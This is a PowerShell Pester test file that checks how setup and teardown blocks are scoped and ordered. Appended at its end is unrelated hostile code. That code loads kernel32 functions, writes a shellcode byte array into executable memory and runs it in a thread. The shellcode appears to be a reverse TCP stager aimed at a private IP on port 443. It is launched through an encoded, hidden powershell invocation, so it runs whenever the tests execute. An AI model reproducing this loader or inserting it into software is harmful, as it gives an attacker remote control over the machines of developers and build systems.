Set-StrictMode -Version Latest

Describe 'Describe-Scoped Test Case setup' {
    BeforeEach {
        $testVariable = 'From BeforeEach'
    }

    $testVariable = 'Set in Describe'

    It 'Assigns the correct value in first test' {
        $testVariable | Should -Be 'From BeforeEach'
        $testVariable = 'Set in It'
    }

    It 'Assigns the correct value in subsequent tests' {
        $testVariable | Should -Be 'From BeforeEach'
    }
}

Describe 'Describe-Scoped Test Case setup using named ScriptBlock-parameter' {
    BeforeEach -Scriptblock {
        $testVariable = 'From BeforeEach'
    }

    $testVariable = 'Set in Describe'

    It 'Assigns the correct value in first test' {
        $testVariable | Should -Be 'From BeforeEach'
        $testVariable = 'Set in It'
    }

    It 'Assigns the correct value in subsequent tests' {
        $testVariable | Should -Be 'From BeforeEach'
    }
}

Describe 'Context-scoped Test Case setup' {
    $testVariable = 'Set in Describe'

    Context 'The context' {
        BeforeEach {
            $testVariable = 'From BeforeEach'
        }

        It 'Assigns the correct value inside the context' {
            $testVariable | Should -Be 'From BeforeEach'
        }
    }

    It 'Reports the original value after the Context' {
        $testVariable | Should -Be 'Set in Describe'
    }
}

Describe 'Multiple Test Case setup blocks' {
    $testVariable = 'Set in Describe'

    BeforeEach {
        $testVariable = 'Set in Describe BeforeEach'
    }

    Context 'The context' {
        It 'Executes Describe setup blocks first, then Context blocks in the order they were defined (even if they are defined after the It block.)' {
            $testVariable | Should -Be 'Set in the second Context BeforeEach'
        }

        BeforeEach {
            $testVariable = 'Set in the first Context BeforeEach'
        }

        BeforeEach {
            $testVariable = 'Set in the second Context BeforeEach'
        }
    }

    It 'Continues to execute Describe setup blocks after the Context' {
        $testVariable | Should -Be 'Set in Describe BeforeEach'
    }
}

Describe 'Describe-scoped Test Case teardown' {
    $testVariable = 'Set in Describe'

    AfterEach {
        $testVariable = 'Set in AfterEach'
    }

    It 'Does not modify the variable before the first test' {
        $testVariable | Should -Be 'Set in Describe'
    }

    It 'Modifies the variable after the first test' {
        $testVariable | Should -Be 'Set in AfterEach'
    }
}

Describe 'Multiple Test Case teardown blocks' {
    $testVariable = 'Set in Describe'

    AfterEach {
        $testVariable = 'Set in Describe AfterEach'
    }

    Context 'The context' {
        AfterEach {
            $testVariable = 'Set in the first Context AfterEach'
        }

        It 'Performs a test in Context' { "some output to prevent the It being marked as Pending and failing because of Strict mode"}

        It 'Executes Describe teardown blocks after Context teardown blocks' {
            $testVariable | Should -Be 'Set in the second Describe AfterEach'
        }
    }

    AfterEach {
        $testVariable = 'Set in the second Describe AfterEach'
    }
}

$script:DescribeBeforeAllCounter = 0
$script:DescribeAfterAllCounter = 0
$script:ContextBeforeAllCounter = 0
$script:ContextAfterAllCounter = 0

Describe 'Test Group Setup and Teardown' {
    It 'Executed the Describe BeforeAll regardless of definition order' {
        $script:DescribeBeforeAllCounter | Should -Be 1
    }

    It 'Did not execute any other block yet' {
        $script:DescribeAfterAllCounter | Should -Be 0
        $script:ContextBeforeAllCounter | Should -Be 0
        $script:ContextAfterAllCounter  | Should -Be 0
    }

    BeforeAll {
        $script:DescribeBeforeAllCounter++
    }

    AfterAll {
        $script:DescribeAfterAllCounter++
    }

    Context 'Context scoped setup and teardown' {
        BeforeAll {
            $script:ContextBeforeAllCounter++
        }

        AfterAll {
            $script:ContextAfterAllCounter++
        }

        It 'Executed the Context BeforeAll block' {
            $script:ContextBeforeAllCounter | Should -Be 1
        }

        It 'Has not executed any other blocks yet' {
            $script:DescribeBeforeAllCounter | Should -Be 1
            $script:DescribeAfterAllCounter  | Should -Be 0
            $script:ContextAfterAllCounter   | Should -Be 0
        }
    }

    It 'Executed the Context AfterAll block' {
        $script:ContextAfterAllCounter | Should -Be 1
    }
}

Describe 'Finishing TestGroup Setup and Teardown tests' {
    It 'Executed each Describe and Context group block once' {
        $script:DescribeBeforeAllCounter | Should -Be 1
        $script:DescribeAfterAllCounter  | Should -Be 1
        $script:ContextBeforeAllCounter  | Should -Be 1
        $script:ContextAfterAllCounter   | Should -Be 1
    }
}


if ($PSVersionTable.PSVersion.Major -ge 3) {
    $thisTestScriptFilePath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($PSCommandPath)

    Describe 'Script Blocks and file association (testing automatic variables)' {
        BeforeEach {
            $commandPath = $PSCommandPath
        }

        $beforeEachBlock = InModuleScope Pester {
            $pester.CurrentTestGroup.BeforeEach[0]
        }

        It 'Creates script block objects associated with the proper file' {
            $scriptBlockFilePath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($beforeEachBlock.File)

            $scriptBlockFilePath | Should -Be $thisTestScriptFilePath
        }

        It 'Has the correct automatic variable values inside the BeforeEach block' {
            $commandPath | Should -Be $PSCommandPath
        }
    }
}



$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}

